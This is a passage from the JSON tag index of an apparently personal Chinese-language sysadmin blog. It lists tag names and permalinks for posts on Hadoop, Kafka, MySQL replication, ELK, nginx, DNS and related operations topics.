:"elk","slug":"elk","permalink":"https://garywu520.github.io/tags/elk/"},{"name":"curl","slug":"curl","permalink":"https://garywu520.github.io/tags/curl/"},{"name":"curl -XPOST","slug":"curl-XPOST","permalink":"https://garywu520.github.io/tags/curl-XPOST/"},{"name":"shell变量","slug":"shell变量","permalink":"https://garywu520.github.io/tags/shell%E5%8F%98%E9%87%8F/"},{"name":"json引用","slug":"json引用","permalink":"https://garywu520.github.io/tags/json%E5%BC%95%E7%94%A8/"},{"name":"udp","slug":"udp","permalink":"https://garywu520.github.io/tags/udp/"},{"name":"tcpdump","slug":"tcpdump","permalink":"https://garywu520.github.io/tags/tcpdump/"},{"name":"udp抓包","slug":"udp抓包","permalink":"https://garywu520.github.io/tags/udp%E6%8A%93%E5%8C%85/"},{"name":"udp代理","slug":"udp代理","permalink":"https://garywu520.github.io/tags/udp%E4%BB%A3%E7%90%86/"},{"name":"GFW","slug":"GFW","permalink":"https://garywu520.github.io/tags/GFW/"},{"name":"UDP","slug":"UDP","permalink":"https://garywu520.github.io/tags/UDP/"},{"name":"UDP Ping","slug":"UDP-Ping","permalink":"https://garywu520.github.io/tags/UDP-Ping/"},{"name":"Ping","slug":"Ping","permalink":"https://garywu520.github.io/tags/Ping/"},{"name":"dig","slug":"dig","permalink":"https://garywu520.github.io/tags/dig/"},{"name":"queryperf","slug":"queryperf","permalink":"https://garywu520.github.io/tags/queryperf/"},{"name":"es集群","slug":"es集群","permalink":"https://garywu520.github.io/tags/es%E9%9B%86%E7%BE%A4/"},{"name":"zabbix监控","slug":"zabbix监控","permalink":"https://garywu520.github.io/tags/zabbix%E7%9B%91%E6%8E%A7/"},{"name":"ES分片","slug":"ES分片","permalink":"https://garywu520.github.io/tags/ES%E5%88%86%E7%89%87/"},{"name":"shards","slug":"shards","permalink":"https://garywu520.github.io/tags/shards/"},{"name":"unassigned shards","slug":"unassigned-shards","permalink":"https://garywu520.github.io/tags/unassigned-shards/"},{"name":"系统备份","slug":"系统备份","permalink":"https://garywu520.github.io/tags/%E7%B3%BB%E7%BB%9F%E5%A4%87%E4%BB%BD/"},{"name":"系统恢复","slug":"系统恢复","permalink":"https://garywu520.github.io/tags/%E7%B3%BB%E7%BB%9F%E6%81%A2%E5%A4%8D/"},{"name":"ESXI PATH","slug":"ESXI-PATH","permalink":"https://garywu520.github.io/tags/ESXI-PATH/"},{"name":"ESXI补丁升级","slug":"ESXI补丁升级","permalink":"https://garywu520.github.io/tags/ESXI%E8%A1%A5%E4%B8%81%E5%8D%87%E7%BA%A7/"},{"name":"ESXI6.7","slug":"ESXI6-7","permalink":"https://garywu520.github.io/tags/ESXI6-7/"},{"name":"binlog","slug":"binlog","permalink":"https://garywu520.github.io/tags/binlog/"},{"name":"binlog2sql","slug":"binlog2sql","permalink":"https://garywu520.github.io/tags/binlog2sql/"},{"name":"row","slug":"row","permalink":"https://garywu520.github.io/tags/row/"},{"name":"数据闪回","slug":"数据闪回","permalink":"https://garywu520.github.io/tags/%E6%95%B0%E6%8D%AE%E9%97%AA%E5%9B%9E/"},{"name":"python","slug":"python","permalink":"https://garywu520.github.io/tags/python/"},{"name":"CDH","slug":"CDH","permalink":"https://garywu520.github.io/tags/CDH/"},{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"HDFS","slug":"HDFS","permalink":"https://garywu520.github.io/tags/HDFS/"},{"name":"CM","slug":"CM","permalink":"https://garywu520.github.io/tags/CM/"},{"name":"balancer","slug":"balancer","permalink":"https://garywu520.github.io/tags/balancer/"},{"name":"重新平衡","slug":"重新平衡","permalink":"https://garywu520.github.io/tags/%E9%87%8D%E6%96%B0%E5%B9%B3%E8%A1%A1/"},{"name":"重新分布","slug":"重新分布","permalink":"https://garywu520.github.io/tags/%E9%87%8D%E6%96%B0%E5%88%86%E5%B8%83/"},{"name":"Hive","slug":"Hive","permalink":"https://garywu520.github.io/tags/Hive/"},{"name":"Hadoop","slug":"Hadoop","permalink":"https://garywu520.github.io/tags/Hadoop/"},{"name":"spark","slug":"spark","permalink":"https://garywu520.github.io/tags/spark/"},{"name":"tez","slug":"tez","permalink":"https://garywu520.github.io/tags/tez/"},{"name":"单用户模式","slug":"单用户模式","permalink":"https://garywu520.github.io/tags/%E5%8D%95%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8F/"},{"name":"多用户模式","slug":"多用户模式","permalink":"https://garywu520.github.io/tags/%E5%A4%9A%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8F/"},{"name":"远程模式","slug":"远程模式","permalink":"https://garywu520.github.io/tags/%E8%BF%9C%E7%A8%8B%E6%A8%A1%E5%BC%8F/"},{"name":"hive","slug":"hive","permalink":"https://garywu520.github.io/tags/hive/"},{"name":"HQL","slug":"HQL","permalink":"https://garywu520.github.io/tags/HQL/"},{"name":"主从复制","slug":"主从复制","permalink":"https://garywu520.github.io/tags/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"name":"降低延迟","slug":"降低延迟","permalink":"https://garywu520.github.io/tags/%E9%99%8D%E4%BD%8E%E5%BB%B6%E8%BF%9F/"},{"name":"mysql 5.7","slug":"mysql-5-7","permalink":"https://garywu520.github.io/tags/mysql-5-7/"},{"name":"多线程主从复制","slug":"多线程主从复制","permalink":"https://garywu520.github.io/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"name":"vm","slug":"vm","permalink":"https://garywu520.github.io/tags/vm/"},{"name":"精简置备","slug":"精简置备","permalink":"https://garywu520.github.io/tags/%E7%B2%BE%E7%AE%80%E7%BD%AE%E5%A4%87/"},{"name":"厚置备","slug":"厚置备","permalink":"https://garywu520.github.io/tags/%E5%8E%9A%E7%BD%AE%E5%A4%87/"},{"name":"磁盘置备","slug":"磁盘置备","permalink":"https://garywu520.github.io/tags/%E7%A3%81%E7%9B%98%E7%BD%AE%E5%A4%87/"},{"name":"disk","slug":"disk","permalink":"https://garywu520.github.io/tags/disk/"},{"name":"VMware vSphere Client","slug":"VMware-vSphere-Client","permalink":"https://garywu520.github.io/tags/VMware-vSphere-Client/"},{"name":"VMware Workstation Pro","slug":"VMware-Workstation-Pro","permalink":"https://garywu520.github.io/tags/VMware-Workstation-Pro/"},{"name":"vmdk","slug":"vmdk","permalink":"https://garywu520.github.io/tags/vmdk/"},{"name":"Sqoop","slug":"Sqoop","permalink":"https://garywu520.github.io/tags/Sqoop/"},{"name":"hadoop Job","slug":"hadoop-Job","permalink":"https://garywu520.github.io/tags/hadoop-Job/"},{"name":"sqoop","slug":"sqoop","permalink":"https://garywu520.github.io/tags/sqoop/"},{"name":"sqoop导入导出","slug":"sqoop导入导出","permalink":"https://garywu520.github.io/tags/sqoop%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/"},{"name":"hadoop用户","slug":"hadoop用户","permalink":"https://garywu520.github.io/tags/hadoop%E7%94%A8%E6%88%B7/"},{"name":"数据转换工具","slug":"数据转换工具","permalink":"https://garywu520.github.io/tags/%E6%95%B0%E6%8D%AE%E8%BD%AC%E6%8D%A2%E5%B7%A5%E5%85%B7/"},{"name":"sz","slug":"sz","permalink":"https://garywu520.github.io/tags/sz/"},{"name":"rz","slug":"rz","permalink":"https://garywu520.github.io/tags/rz/"},{"name":"zmodem ssh","slug":"zmodem-ssh","permalink":"https://garywu520.github.io/tags/zmodem-ssh/"},{"name":"shell脚本","slug":"shell脚本","permalink":"https://garywu520.github.io/tags/shell%E8%84%9A%E6%9C%AC/"},{"name":"递归目录","slug":"递归目录","permalink":"https://garywu520.github.io/tags/%E9%80%92%E5%BD%92%E7%9B%AE%E5%BD%95/"},{"name":"Trash","slug":"Trash","permalink":"https://garywu520.github.io/tags/Trash/"},{"name":"expunge","slug":"expunge","permalink":"https://garywu520.github.io/tags/expunge/"},{"name":"broker","slug":"broker","permalink":"https://garywu520.github.io/tags/broker/"},{"name":"KAFKA","slug":"KAFKA","permalink":"https://garywu520.github.io/tags/KAFKA/"},{"name":"KAFKA版本升级","slug":"KAFKA版本升级","permalink":"https://garywu520.github.io/tags/KAFKA%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7/"},{"name":"kafka","slug":"kafka","permalink":"https://garywu520.github.io/tags/kafka/"},{"name":"topic","slug":"topic","permalink":"https://garywu520.github.io/tags/topic/"},{"name":"删除topic","slug":"删除topic","permalink":"https://garywu520.github.io/tags/%E5%88%A0%E9%99%A4topic/"},{"name":"consumer","slug":"consumer","permalink":"https://garywu520.github.io/tags/consumer/"},{"name":"JDBC","slug":"JDBC","permalink":"https://garywu520.github.io/tags/JDBC/"},{"name":"MySQL驱动","slug":"MySQL驱动","permalink":"https://garywu520.github.io/tags/MySQL%E9%A9%B1%E5%8A%A8/"},{"name":"hdfs空文件","slug":"hdfs空文件","permalink":"https://garywu520.github.io/tags/hdfs%E7%A9%BA%E6%96%87%E4%BB%B6/"},{"name":"hadoop fs","slug":"hadoop-fs","permalink":"https://garywu520.github.io/tags/hadoop-fs/"},{"name":"rm恢复","slug":"rm恢复","permalink":"https://garywu520.github.io/tags/rm%E6%81%A2%E5%A4%8D/"},{"name":"mv恢复","slug":"mv恢复","permalink":"https://garywu520.github.io/tags/mv%E6%81%A2%E5%A4%8D/"},{"name":"umount","slug":"umount","permalink":"https://garywu520.github.io/tags/umount/"},{"name":"linux文件恢复","slug":"linux文件恢复","permalink":"https://garywu520.github.io/tags/linux%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/"},{"name":"yarn","slug":"yarn","permalink":"https://garywu520.github.io/tags/yarn/"},{"name":"Yarn","slug":"Yarn","permalink":"https://garywu520.github.io/tags/Yarn/"},{"name":"MR","slug":"MR","permalink":"https://garywu520.github.io/tags/MR/"},{"name":"MapReduce","slug":"MapReduce","permalink":"https://garywu520.github.io/tags/MapReduce/"},{"name":"高级运维YAR","slug":"高级运维YAR","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4YAR/"},{"name":"Mars","slug":"Mars","permalink":"https://garywu520.github.io/tags/Mars/"},{"name":"HDFS Shell","slug":"HDFS-Shell","permalink":"https://garywu520.github.io/tags/HDFS-Shell/"},{"name":"Block","slug":"Block","permalink":"https://garywu520.github.io/tags/Block/"},{"name":"namenode","slug":"namenode","permalink":"https://garywu520.github.io/tags/namenode/"},{"name":"datanode","slug":"datanode","permalink":"https://garywu520.github.io/tags/datanode/"},{"name":"secondary namenode","slug":"secondary-namenode","permalink":"https://garywu520.github.io/tags/secondary-namenode/"},{"name":"checkpoint","slug":"checkpoint","permalink":"https://garywu520.github.io/tags/checkpoint/"},{"name":"机架感知","slug":"机架感知","permalink":"https://garywu520.github.io/tags/%E6%9C%BA%E6%9E%B6%E6%84%9F%E7%9F%A5/"},{"name":"postfix","slug":"postfix","permalink":"https://garywu520.github.io/tags/postfix/"},{"name":"mailx","slug":"mailx","permalink":"https://garywu520.github.io/tags/mailx/"},{"name":"sendmail","slug":"sendmail","permalink":"https://garywu520.github.io/tags/sendmail/"},{"name":"ssmtp","slug":"ssmtp","permalink":"https://garywu520.github.io/tags/ssmtp/"},{"name":"dd","slug":"dd","permalink":"https://garywu520.github.io/tags/dd/"},{"name":"Netflix","slug":"Netflix","permalink":"https://garywu520.github.io/tags/Netflix/"},{"name":"telegram","slug":"telegram","permalink":"https://garywu520.github.io/tags/telegram/"},{"name":"tg","slug":"tg","permalink":"https://garywu520.github.io/tags/tg/"},{"name":"Netflix群组","slug":"Netflix群组","permalink":"https://garywu520.github.io/tags/Netflix%E7%BE%A4%E7%BB%84/"},{"name":"Netflix解锁","slug":"Netflix解锁","permalink":"https://garywu520.github.io/tags/Netflix%E8%A7%A3%E9%94%81/"},{"name":"Netflix DNS解锁","slug":"Netflix-DNS解锁","permalink":"https://garywu520.github.io/tags/Netflix-DNS%E8%A7%A3%E9%94%81/"},{"name":"Pandora","slug":"Pandora","permalink":"https://garywu520.github.io/tags/Pandora/"},{"name":"流媒体","slug":"流媒体","permalink":"https://garywu520.github.io/tags/%E6%B5%81%E5%AA%92%E4%BD%93/"},{"name":"TVB","slug":"TVB","permalink":"https://garywu520.github.io/tags/TVB/"},{"name":"苹果动","slug":"苹果动","permalink":"https://garywu520.github.io/tags/%E8%8B%B9%E6%9E%9C%E5%8A%A8/"},{"name":"BBC","slug":"BBC","permalink":"https://garywu520.github.io/tags/BBC/"},{"name":"bbc iplayer","slug":"bbc-iplayer","permalink":"https://garywu520.github.io/tags/bbc-iplayer/"},{"name":"巴哈姆特","slug":"巴哈姆特","permalink":"https://garywu520.github.io/tags/%E5%B7%B4%E5%93%88%E5%A7%86%E7%89%B9/"},{"name":"动画疯","slug":"动画疯","permalink":"https://garywu520.github.io/tags/%E5%8A%A8%E7%94%BB%E7%96%AF/"},{"name":"HBO","slug":"HBO","permalink":"https://garywu520.github.io/tags/HBO/"},{"name":"zsh","slug":"zsh","permalink":"https://garywu520.github.io/tags/zsh/"},{"name":"ohmyzsh","slug":"ohmyzsh","permalink":"https://garywu520.github.io/tags/ohmyzsh/"},{"name":"terminal","slug":"terminal","permalink":"https://garywu520.github.io/tags/terminal/"},{"name":"终端","slug":"终端","permalink":"https://garywu520.github.io/tags/%E7%BB%88%E7%AB%AF/"},{"name":"expire_logs_days","slug":"expire-logs-days","permalink":"https://garywu520.github.io/tags/expire-logs-days/"},{"name":"binlog_size","slug":"binlog-size","permalink":"https://garywu520.github.io/tags/binlog-size/"},{"name":"Hue","slug":"Hue","permalink":"https://garywu520.github.io/tags/Hue/"},{"name":"Impala","slug":"Impala","permalink":"https://garywu520.github.io/tags/Impala/"},{"name":"Hbase","slug":"Hbase","permalink":"https://garywu520.github.io/tags/Hbase/"},{"name":"KuDu","slug":"KuDu","permalink":"https://garywu520.github.io/tags/KuDu/"},{"name":"key 统计","slug":"key-统计","permalink":"https://garywu520.github.io/tags/key-%E7%BB%9F%E8%AE%A1/"},{"name":"redis_cli","slug":"redis-cli","permalink":"https://garywu520.github.io/tags/redis-cli/"},{"name":"omsa","slug":"omsa","permalink":"https://garywu520.github.io/tags/omsa/"},{"name":"dtk","slug":"dtk","permalink":"https://garywu520.github.io/tags/dtk/"},{"name":"dell","slug":"dell","permalink":"https://garywu520.github.io/tags/dell/"},{"name":"sudoers","slug":"sudoers","permalink":"https://garywu520.github.io/tags/sudoers/"},{"name":"linux特权控制","slug":"linux特权控制","permalink":"https://garywu520.github.io/tags/linux%E7%89%B9%E6%9D%83%E6%8E%A7%E5%88%B6/"},{"name":"nopasswd","slug":"nopasswd","permalink":"https://garywu520.github.io/tags/nopasswd/"},{"name":"HA","slug":"HA","permalink":"https://garywu520.github.io/tags/HA/"},{"name":"RM HA","slug":"RM-HA","permalink":"https://garywu520.github.io/tags/RM-HA/"},{"name":"hbase","slug":"hbase","permalink":"https://garywu520.github.io/tags/hbase/"},{"name":"cache","slug":"cache","permalink":"https://garywu520.github.io/tags/cache/"},{"name":"proxy cache","slug":"proxy-cache","permalink":"https://garywu520.github.io/tags/proxy-cache/"},{"name":"Nginx缓存清理","slug":"Nginx缓存清理","permalink":"https://garywu520.github.io/tags/Nginx%E7%BC%93%E5%AD%98%E6%B8%85%E7%90%86/"},{"name":"DNS over HTTPS","slug":"DNS-over-HTTPS","permalink":"https://garywu520.github.io/tags/DNS-over-HTTPS/"},{"name":"cloudflare","slug":"cloudflare","permalink":"https://garywu520.github.io/tags/cloudflare/"},{"name":"glibc","slug":"glibc","permalink":"https://garywu520.github.io/tags/glibc/"},{"name":"strings","slug":"strings","permalink":"https://garywu520.github.io/tags/strings/"},{"name":"glibc升级","slug":"glibc升级","permalink":"https://garywu520.github.io/tags/glibc%E5%8D%87%E7%BA%A7/"},{"name":"Gateway","slug":"Gateway","permalink":"https://garywu520.github.io/tags/Gateway/"},{"name":"cdh","slug":"cdh","permalink":"https://garywu520.github.io/tags/cdh/"},{"name":"cloudera","slug":"cloudera","permalink":"https://garywu520.github.io/tags/cloudera/"},{"name":"cloudera Manager","slug":"cloudera-Manager","permalink":"https://garywu520.github.io/tags/cloudera-Manager/"},{"name":"Topic","slug":"Topic","permalink":"https://garywu520.github.io/tags/Topic/"},{"name":"Replication","slug":"Replication","permalink":"https://garywu520.github.io/tags/Replication/"},{"name":"分区热迁移","slug":"分区热迁移","permalink":"https://garywu520.github.io/tags/%E5%88%86%E5%8C%BA%E7%83%AD%E8%BF%81%E7%A7%BB/"},{"name":"fuse","slug":"fuse","permalink":"https://garywu520.github.io/tags/fuse/"},{"name":"hadoop-fuse-dfs","slug":"hadoop-fuse-dfs","permalink":"https://garywu520.github.io/tags/hadoop-fuse-dfs/"},{"name":"HDFS挂载","slug":"HDFS挂载","permalink":"https://garywu520.github.io/tags/HDFS%E6%8C%82%E8%BD%BD/"},{"name":"parcel","slug":"parcel","permalink":"https://garywu520.github.io/tags/parcel/"},{"name":"HDFS LZO","slug":"HDFS-LZO","permalink":"https://garywu520.github.io/tags/HDFS-LZO/"},{"name":"Rack","slug":"Rack","permalink":"https://garywu520.github.io/tags/Rack/"},{"name":"MySQL主从切换","slug":"MySQL主从切换","permalink":"https://garywu520.github.io/tags/MySQL%E4%B8%BB%E4%BB%8E%E5%88%87%E6%8D%A2/"},{"name":"MySQL从提升为主","slug":"MySQL从提升为主","permalink":"https://garywu520.github.io/tags/MySQL%E4%BB%8E%E6%8F%90%E5%8D%87%E4%B8%BA%E4%B8%BB/"},{"name":"Jumpserver","slug":"Jumpserver","permalink":"https://garywu520.github.io/tags/Jumpserver/"},{"name":"备机部署","slug":"备机部署","permalink":"https://garywu520.github.io/tags/%E5%A4%87%E6%9C%BA%E9%83%A8%E7%BD%B2/"},{"name":"双主复制","slug":"双主复制","permalink":"https://garywu520.github.io/tags/%E5%8F%8C%E4%B8%BB%E5%A4%8D%E5%88%B6/"},{"name":"主主同步","slug":"主主同步","permalink":"https://garywu520.github.io/tags/%E4%B8%BB%E4%B8%BB%E5%90%8C%E6%AD%A5/"},{"name":"Master-Master","slug":"Master-Master","permalink":"https://garywu520.github.io/tags/Master-Master/"},{"name":"centos6","slug":"centos6","permalink":"https://garywu520.github.io/tags/centos6/"},{"name":"启动卡在进度条","slug":"启动卡在进度条","permalink":"https://garywu520.github.io/tags/%E5%90%AF%E5%8A%A8%E5%8D%A1%E5%9C%A8%E8%BF%9B%E5%BA%A6%E6%9D%A1/"},{"name":"python3","slug":"python3","permalink":"https://garywu520.github.io/tags/python3/"},{"name":"pip","slug":"pip","permalink":"https://garywu520.github.io/tags/pip/"},{"name":"mariadb主从","slug":"mariadb主从","permalink":"https://garywu520.github.io/tags/mariadb%E4%B8%BB%E4%BB%8E/"},{"name":"mysql主从","slug":"mysql主从","permalink":"https://garywu520.github.io/tags/mysql%E4%B8%BB%E4%BB%8E/"},{"name":"mariadb","slug":"mariadb","permalink":"https://garywu520.github.io/tags/mariadb/"},{"name":"触发器","slug":"触发器","permalink":"https://garywu520.github.io/tags/%E8%A7%A6%E5%8F%91%E5%99%A8/"},{"name":"表达式","slug":"表达式","permalink":"https://garywu520.github.io/tags/%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"流量叠加","slug":"流量叠加","permalink":"https://garywu520.github.io/tags/%E6%B5%81%E9%87%8F%E5%8F%A0%E5%8A%A0/"},{"name":"触发器表达式","slug":"触发器表达式","permalink":"https://garywu520.github.io/tags/%E8%A7%A6%E5%8F%91%E5%99%A8%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"tmp","slug":"tmp","permalink":"https://garywu520.github.io/tags/tmp/"},{"name":"find","slug":"find","permalink":"https://garywu520.github.io/tags/find/"},{"name":"Argument list too long","slug":"Argument-list-too-long","permalink":"https://garywu520.github.io/tags/Argument-list-too-long/"},{"name":"rm","slug":"rm","permalink":"https://garywu520.github.io/tags/rm/"},{"name":"kill","slug":"kill","permalink":"https://garywu520.github.io/tags/kill/"},{"name":"进程","slug":"进程","permalink":"https://garywu520.github.io/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"批量kill进程","slug":"批量kill进程","permalink":"https://garywu520.github.io/tags/%E6%89%B9%E9%87%8Fkill%E8%BF%9B%E7%A8%8B/"},{"name":"跳板机","slug":"跳板机","permalink":"https://garywu520.github.io/tags/%E8%B7%B3%E6%9D%BF%E6%9C%BA/"},{"name":"堡垒机","slug":"堡垒机","permalink":"https://garywu520.github.io/tags/%E5%A0%A1%E5%9E%92%E6%9C%BA/"},{"name":"Cacti流量叠加图形","slug":"Cacti流量叠加图形","permalink":"https://garywu520.github.io/tags/Cacti%E6%B5%81%E9%87%8F%E5%8F%A0%E5%8A%A0%E5%9B%BE%E5%BD%A2/"},{"name":"Cacti整合图形","slug":"Cacti整合图形","permalink":"https://garywu520.github.io/tags/Cacti%E6%95%B4%E5%90%88%E5%9B%BE%E5%BD%A2/"},{"name":"Graph","slug":"Graph","permalink":"https://garywu520.github.io/tags/Graph/"},{"name":"io","slug":"io","permalink":"https://garywu520.github.io/tags/io/"},{"name":"磁盘io","slug":"磁盘io","permalink":"https://garywu520.github.io/tags/%E7%A3%81%E7%9B%98io/"},{"name":"iotop","slug":"iotop","permalink":"https://garywu520.github.io/tags/iotop/"},{"name":"mongo","slug":"mongo","permalink":"https://garywu520.github.io/tags/mongo/"},{"name":"查询mongo","slug":"查询mongo","permalink":"https://garywu520.github.io/tags/%E6%9F%A5%E8%AF%A2mongo/"},{"name":"limit","slug":"limit","permalink":"https://garywu520.github.io/tags/limit/"},{"name":"emerge","slug":"emerge","permalink":"https://garywu520.github.io/tags/emerge/"},{"name":"gentoo","slug":"gentoo","permalink":"https://garywu520.github.io/tags/gentoo/"},{"name":"install","slug":"install","permalink":"https://garywu520.github.io/tags/install/"},{"name":"交换分区","slug":"交换分区","permalink":"https://garywu520.github.io/tags/%E4%BA%A4%E6%8D%A2%E5%88%86%E5%8C%BA/"},{"name":"Openstack","slug":"Openstack","permalink":"https://garywu520.github.io/tags/Openstack/"},{"name":"esxi","slug":"esxi","permalink":"https://garywu520.github.io/tags/esxi/"},{"name":"混杂模式","slug":"混杂模式","permalink":"https://garywu520.github.io/tags/%E6%B7%B7%E6%9D%82%E6%A8%A1%E5%BC%8F/"},{"name":"主从同步","slug":"主从同步","permalink":"https://garywu520.github.io/tags/%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5/"},{"name":"主键错误","slug":"主键错误","permalink":"https://garywu520.github.io/tags/%E4%B8%BB%E9%94%AE%E9%94%99%E8%AF%AF/"},{"name":"aux","slug":"aux","permalink":"https://garywu520.github.io/tags/aux/"},{"name":"查看进程内存","slug":"查看进程内存","permalink":"https://garywu520.github.io/tags/%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98/"},{"name":"date","slug":"date","permalink":"https://garywu520.github.io/tags/date/"},{"name":"时间戳","slug":"时间戳","permalink":"https://garywu520.github.io/tags/%E6%97%B6%E9%97%B4%E6%88%B3/"},{"name":"time","slug":"time","permalink":"https://garywu520.github.io/tags/time/"},{"name":"expect","slug":"expect","permalink":"https://garywu520.github.io/tags/expect/"},{"name":"easyrsa","slug":"easyrsa","permalink":"https://garywu520.github.io/tags/easyrsa/"},{"name":"ssh免交互","slug":"ssh免交互","permalink":"https://garywu520.github.io/tags/ssh%E5%85%8D%E4%BA%A4%E4%BA%92/"},{"name":"免交互","slug":"免交互","permalink":"https://garywu520.github.io/tags/%E5%85%8D%E4%BA%A4%E4%BA%92/"},{"name":"cmake3","slug":"cmake3","permalink":"https://garywu520.github.io/tags/cmake3/"},{"name":"boost","slug":"boost","permalink":"https://garywu520.github.io/tags/boost/"},{"name":"libssl","slug":"libssl","permalink":"https://garywu520.github.io/tags/libssl/"},{"name":"libcrypto","slug":"libcrypto","permalink":"https://garywu520.github.io/tags/libcrypto/"},{"name":"免费SSL证书","slug":"免费SSL证书","permalink":"https://garywu520.github.io/tags/%E5%85%8D%E8%B4%B9SSL%E8%AF%81%E4%B9%A6/"},{"name":"certbot","slug":"certbot","permalink":"https://garywu520.github.io/tags/certbot/"},{"name":"Let's Encrypt","slug":"Let-s-Encrypt","permalink":"https://garywu520.github.io/tags/Let-s-Encrypt/"},{"name":"SSL证书自动续签","slug":"SSL证书自动续签","permalink":"https://garywu520.github.io/tags/SSL%E8%AF%81%E4%B9%A6%E8%87%AA%E5%8A%A8%E7%BB%AD%E7%AD%BE/"},{"name":"rsync","slug":"rsync","permalink":"https://garywu520.github.io/tags/rsync/"},{"name":"rsync限速","slug":"rsync限速","permalink":"https://garywu520.github.io/tags/rsync%E9%99%90%E9%80%9F/"},{"name":"bwlimit","slug":"bwlimit","permalink":"https://garywu520.github.io/tags/bwlimit/"},{"name":"数组","slug":"数组","permalink":"https://garywu520.github.io/tags/%E6%95%B0%E7%BB%84/"},{"name":"ovpn","slug":"ovpn","permalink":"https://garywu520.github.io/tags/ovpn/"},{"name":"vpn","slug":"vpn","permalink":"https://garywu520.github.io/tags/vpn/"},{"name":"easy-rsa3","slug":"easy-rsa3","permalink":"https://garywu520.github.io/tags/easy-rsa3/"},{"name":"bind","slug":"bind","permalink":"https://garywu520.github.io/tags/bind/"},{"name":"bind9","slug":"bind9","permalink":"https://garywu520.github.io/tags/bind9/"},{"name":"bind主从","slug":"bind主从","permalink":"https://garywu520.github.io/tags/bind%E4%B8%BB%E4%BB%8E/"},{"name":"迭代DNS","slug":"迭代DNS","permalink":"https://garywu520.github.io/tags/%E8%BF%AD%E4%BB%A3DNS/"},{"name":"root hint","slug":"root-hint","permalink":"https://garywu520.github.io/tags/root-hint/"},{"name":"自动输入密码","slug":"自动输入密码","permalink":"https://garywu520.github.io/tags/%E8%87%AA%E5%8A%A8%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81/"},{"name":"交互式","slug":"交互式","permalink":"https://garywu520.github.io/tags/%E4%BA%A4%E4%BA%92%E5%BC%8F/"},{"name":"非交互","slug":"非交互","permalink":"https://garywu520.github.io/tags/%E9%9D%9E%E4%BA%A4%E4%BA%92/"},{"name":"使用ssh和expect监控RouterOS","slug":"使用ssh和expect监控RouterOS","permalink":"https://garywu520.github.io/tags/%E4%BD%BF%E7%94%A8ssh%E5%92%8Cexpect%E7%9B%91%E6%8E%A7RouterOS/"},{"name":"DNS TLS","slug":"DNS-TLS","permalink":"https://garywu520.github.io/tags/DNS-TLS/"},{"name":"Public DNS","slug":"Public-DNS","permalink":"https://garywu520.github.io/tags/Public-DNS/"},{"name":"mysqldump详解","slug":"mysqldump详解","permalink":"https://garywu520.github.io/tags/mysqldump%E8%AF%A6%E8%A7%A3/"},{"name":"mysql导入导出","slug":"mysql导入导出","permalink":"https://garywu520.github.io/tags/mysql%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/"},{"name":"root远程登录","slug":"root远程登录","permalink":"https://garywu520.github.io/tags/root%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95/"},{"name":"vim","slug":"vim","permalink":"https://garywu520.github.io/tags/vim/"},{"name":"中文乱码","slug":"中文乱码","permalink":"https://garywu520.github.io/tags/%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81/"},{"name":"bugzilla","slug":"bugzilla","permalink":"https://garywu520.github.io/tags/bugzilla/"},{"name":"bugs","slug":"bugs","permalink":"https://garywu520.github.io/tags/bugs/"},{"name":"SECONDARY","slug":"SECONDARY","permalink":"https://garywu520.github.io/tags/SECONDARY/"},{"name":"PRIMARY","slug":"PRIMARY","permalink":"https://garywu520.github.io/tags/PRIMARY/"},{"name":"MongoDB","slug":"MongoDB","permalink":"https://garywu520.github.io/tags/MongoDB/"},{"name":"slave","slug":"slave","permalink":"https://garywu520.github.io/tags/slave/"},{"name":"show dbs","slug":"show-dbs","permalink":"https://garywu520.github.io/tags/show-dbs/"},{"name":"mysql从库","slug":"mysql从库","permalink":"https://garywu520.github.io/tags/mysql%E4%BB%8E%E5%BA%93/"},{"name":"同步个别库","slug":"同步个别库","permalink":"https://garywu520.github.io/tags/%E5%90%8C%E6%AD%A5%E4%B8%AA%E5%88%AB%E5%BA%93/"},{"name":"innobackup","slug":"innobackup","permalink":"https://garywu520.github.io/tags/innobackup/"},{"name":"xtrabackup","slug":"xtrabackup","permalink":"https://garywu520.github.io/tags/xtrabackup/"},{"name":"锁表","slug":"锁表","permalink":"https://garywu520.github.io/tags/%E9%94%81%E8%A1%A8/"},{"name":"变量传参","slug":"变量传参","permalink":"https://garywu520.github.io/tags/%E5%8F%98%E9%87%8F%E4%BC%A0%E5%8F%82/"},{"name":"shell传参","slug":"shell传参","permalink":"https://garywu520.github.io/tags/shell%E4%BC%A0%E5%8F%82/"},{"name":"MariaDB","slug":"MariaDB","permalink":"https://garywu520.github.io/tags/MariaDB/"},{"name":"Galera","slug":"Galera","permalink":"https://garywu520.github.io/tags/Galera/"},{"name":"Cluster","slug":"Cluster","permalink":"https://garywu520.github.io/tags/Cluster/"},{"name":"CC","slug":"CC","permalink":"https://garywu520.github.io/tags/CC/"},{"name":"Ddos","slug":"Ddos","permalink":"https://garywu520.github.io/tags/Ddos/"},{"name":"nginx日志","slug":"nginx日志","permalink":"https://garywu520.github.io/tags/nginx%E6%97%A5%E5%BF%97/"},{"name":"高积运维","slug":"高积运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%A7%AF%E8%BF%90%E7%BB%B4/"},{"name":"nginx反爬虫","slug":"nginx反爬虫","permalink":"https://garywu520.github.io/tags/nginx%E5%8F%8D%E7%88%AC%E8%99%AB/"},{"name":"蜘蛛","slug":"蜘蛛","permalink":"https://garywu520.github.io/tags/%E8